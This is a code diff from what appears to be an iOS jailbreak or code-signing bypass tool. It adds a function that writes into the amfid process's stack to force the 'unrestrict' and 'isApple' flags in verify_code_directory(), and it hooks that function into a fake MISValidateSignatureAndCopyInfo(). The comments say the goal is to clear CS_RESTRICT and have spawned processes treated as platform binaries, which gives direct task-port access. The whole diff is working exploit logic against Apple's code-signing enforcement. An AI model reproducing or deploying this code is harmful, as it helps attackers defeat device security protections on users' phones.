@@ -148,10 +148,57 @@ fail_0:
 	return success;
 }
 
+// Set some special output arguments for verify_code_directory().
+//
+// A better way to do this that doesn't involve hardcoding offsets would be to actually steal the
+// AMFID special port, set up our own handler, build the reply message in amfid, send the reply
+// port to amfid, and then have amfid send the reply.
+static void
+verify_code_directory_set_output_parameters(arm_thread_state64_t *state) {
+	// x29 is the frame pointer, from which all the stack arguments and local variables are
+	// based. x29 + 0x10 points to the unrestrict argument, while x29 + 0x20 points to isApple.
+	const uint8_t *x29 = (const uint8_t *)state->__fp;
+	const void *unrestrict_stack_arg = x29 + 0x10;
+	const void *isApple_stack_arg    = x29 + 0x20;
+	// unrestrict is the 9th argument to verify_code_directory(). If set, AMFI will clear the
+	// CS_RESTRICT codesigning flag.
+	const uint32_t *unrestrict_r;
+	bool ok = threadexec_read(amfid_tx, unrestrict_stack_arg,
+			&unrestrict_r, sizeof(unrestrict_r));
+	if (!ok) {
+		goto warn_unrestrict;
+	}
+	uint32_t unrestrict = 1;
+	ok = threadexec_write(amfid_tx, unrestrict_r, &unrestrict, sizeof(unrestrict));
+	if (!ok) {
+warn_unrestrict:
+		WARNING("Could not set %s", "unrestrict");
+	}
+	// isApple is the 11th argument to verify_code_directory(). If set, AMFI will set the
+	// CS_PLATFORM_BINARY codesigning flag. This is useful because it allows us to spawn
+	// processes that get treated as platform binaries, allowing us to manipulate task ports
+	// directly.
+	const uint32_t *isApple_r;
+	ok = threadexec_read(amfid_tx, isApple_stack_arg, &isApple_r, sizeof(isApple_r));
+	if (!ok) {
+		goto warn_isApple;
+	}
+	uint32_t isApple = 1;
+	ok = threadexec_write(amfid_tx, isApple_r, &isApple, sizeof(isApple));
+	if (!ok) {
+warn_isApple:
+		WARNING("Could not set %s", "isApple");
+	}
+	// Another interesting parameter is argument 7, entitlementsValid. If set, AMFI will set
+	// the CS_ENTITLEMENTS_VALIDATED and CS_KILL flags.
+}
+
 // Perform the fake implementation of MISValidateSignatureAndCopyInfo(). This implementation is
 // derived directly from Ian Beer's triple_fetch.
 static bool
 fake_MISValidateSignatureAndCopyInfo(arm_thread_state64_t *state) {
+	// Do a little bit of magic. ;)
+	verify_code_directory_set_output_parameters(state);
 	// Get the arguments.
 	CFStringRef path_r = (CFStringRef) state->__x[0];
 	CFDictionaryRef options_r = (CFDictionaryRef) state->__x[1];
